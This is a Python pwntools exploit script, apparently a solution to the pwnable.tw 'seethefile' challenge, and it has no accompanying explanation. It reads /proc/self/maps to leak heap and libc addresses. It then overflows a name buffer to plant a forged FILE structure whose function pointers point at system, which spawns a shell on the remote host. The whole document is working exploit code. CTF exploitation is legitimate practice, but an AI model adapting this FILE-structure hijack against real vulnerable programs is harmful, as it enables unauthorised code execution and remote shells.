from pwn import*
import time

def open_file(file_name):
    s.send("1\n")
    s.recvuntil(":")
    s.send(file_name+"\n")
    s.recvuntil(":")

def read_file():
    s.send("2\n")
    s.recvuntil(":")

def write_file(option=0):
    s.send("3\n")
    a=s.recvuntil("choice :")
    print(hexdump(a))
    if(option==1):
        #heap=int(a[0x120:0x128],16)
        #libc=int(a[0x181:0x189],16)
        heap=int(a[0x120+15:0x128+15],16)
        libc=int(a[0x181-2:0x189-2],16)+0x1000
        return (heap,libc)


def close_file():
    s.send("4\n")
    s.recvuntil(":")

def exit_menu(name):

    s.send(name+"\n")
s=remote("chall.pwnable.tw", 10200)
#s=process("./seethefile", env = {'LD_PRELOAD' : './libc_32.so.6'})
s.recvuntil(":")
open_file("/proc/self/maps")
read_file()
(heap,libc)=write_file(1)
system=libc+0x3a940#-0xb7e09000+0xb7e43da0#-0x3ada0#+0x3ac5e
leak1=libc-0xb7e09000+0xb7fbbcc0
heap1=heap-0x0900b000+0x900c178
print(hex(heap))
print(hex(libc))
print(hex(system))

close_file()
print("GOOD")
time.sleep(5)
payload=p32(0)+p32(0x161)+"sh\x00\x00"+p32(0)*12+p32(leak1)+p32(3)+p32(0)*3+p32(heap+0x4a8)+p32(0xffffffff)+p32(0xffffffff)+p32(0)+p32(heap+0x4b4)+p32(0)*14+p32(heap1-0x8917178+0x89161ac)+p32(0)*10
payload+=p32(system)*((0x200-len(payload))/4)
pause()
s.send("5\n")
print("GOOD")
time.sleep(1)
s.recvuntil(":")
s.send("\x41"*32+p32(0x804b28c)+payload+"\n")
s.recv(1024)

s.interactive()
s.close()
